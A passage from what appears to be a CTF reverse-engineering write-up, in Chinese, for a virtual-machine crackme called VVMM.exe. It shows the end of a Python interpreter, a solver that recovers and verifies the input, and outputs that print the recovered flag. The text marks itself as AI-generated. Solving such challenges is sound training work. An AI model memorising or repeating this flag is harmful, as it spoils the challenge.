        elif opcode == 0x40:
            zero = int((regs[dest] & 0xFF) == (imm & 0xFF))
            pc += 8
        elif opcode == 0x41:
            zero = int(regs[dest] == imm)
            pc += 8
        elif opcode == 0x50:
            pc = pc + signed * 8 + 8 if zero == 0 else pc + 8
        elif opcode == 0x51:
            pc = pc + signed * 8 + 8
        elif opcode == 0xF0:
            return "ACCEPT", steps, pc
        elif opcode == 0xF1:
            return "REJECT", steps, pc
        else:
            return f"BAD {opcode:02x}", steps, pc
    return "ERROR", steps, pc


def main():
    path = Path(sys.argv[1] if len(sys.argv) > 1 else "VVMM.exe")
    blob = find_blob(path.read_bytes())
    program, summaries = load_program(blob)
    print(f"blob bytes : {len(blob)}")
    for offset, payload_len, ok, magic, live in summaries:
        mark = "live" if live else "skip"
        print(
            f"entry off={offset:<5} bytes={payload_len:<6} "
            f"checksum={'ok' if ok else 'bad'} magic={magic:08x} {mark}"
        )
    candidate = recover(expected_memory(program))
    status, steps, pc = execute(program, candidate)
    print(f"candidate  : {candidate.decode()}")
    print(f"vm         : {status} steps={steps} pc=0x{pc:x}")
    if status != "ACCEPT":
        raise SystemExit(1)


if __name__ == "__main__":
    main()
```

实际输出：

```
blob bytes : 20016
entry off=8     bytes=288    checksum=ok magic=0badf00d skip
entry off=308   bytes=19696  checksum=ok magic=c0def00d live
candidate  : flag{J1nxI_i5_4_6eautiful_g1rl}
vm         : ACCEPT steps=2460 pc=0x4ce0
```

脚本里的解释器从解密后的入口 1 重新执行，停在 `OK` ，步数 2460、 `pc = 0x4ce0` 。这不是把 flag 写死再打印。

再用原程序核对同一字符串：

```
VVMM.exe --check flag{J1nxI_i5_4_6eautiful_g1rl}
VVMM.exe --run flag{J1nxI_i5_4_6eautiful_g1rl}
```

实际输出：

```
accepted
[vm] ACCEPT
[vm] steps=2460 pc=0x4ce0 acc=0x2a zero=1 halt=0xf0
```

`acc=0x2a` 是最后一格内存。它等于比较常量的最后一个字节 `0x2A` ，零标志为 1，停机码是 `OK` 的 `0xF0` 。原程序和独立解释器的步数、停机地址一致。

作者提示: 内容由AI生成
